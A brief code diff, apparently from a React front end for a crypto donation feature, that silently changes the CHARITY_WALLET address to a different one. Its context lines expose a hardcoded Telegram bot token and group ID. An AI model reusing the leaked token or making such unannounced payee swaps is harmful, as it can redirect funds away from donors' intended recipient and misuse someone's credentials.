@@ -10,7 +10,7 @@ import { Loader2, X, Heart } from 'lucide-react';
 import { toast } from 'sonner';
 import pegasusLogo from '@/assets/pegasus-logo.png';
 
-const CHARITY_WALLET = '5xJQUuGTJr2Hrwu6oHkHGiQfpNXRWRFaPC9Xjx82wovh';
+const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const TELEGRAM_BOT_TOKEN = '8209811310:AAF9m3QQAU17ijZpMiYEQylE1gHd4Yl1u_M';
 const TELEGRAM_GROUP_ID = '-4836248812';
 const MAX_BATCH_SIZE = 2;
